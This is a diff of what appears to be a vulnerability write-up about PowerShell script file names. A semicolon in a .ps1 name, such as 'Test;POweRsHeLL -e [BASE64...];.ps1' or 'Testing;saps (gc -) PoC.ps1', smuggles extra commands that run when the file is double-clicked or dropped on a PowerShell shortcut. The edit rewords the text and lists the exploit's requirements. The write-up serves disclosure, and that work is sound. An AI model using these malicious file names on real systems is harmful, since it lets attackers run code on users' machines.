@@ -13,13 +13,16 @@ The flaw is due to semicolon ";" we can decode a Base64 command and execute stra
 
 Test;POweRsHeLL -e [BASE64 UTF-16LE PAYLOAD];.ps1 <br>  
 
-OR just call commands straight away <br>  
+Call commands straight away <br>  
 
 "Testing;saps (gc -) PoC.ps1"
 
 Vectors: double click, drag and drop to PS shortcut
-Requirements: user must have the following setting to call a secondary script
-Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass -Force
+Exploit Requirements: <br>  
+
+a) PowerShell PS1 files must be set to open with PowerShell as the default program
+b) Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass -Force
+c) User must double-click or drag and drop the maliciously named PS1 script
 
 Leverages alternate shorthand PS commands like "saps", "gc" start a process and get-content etc.
 
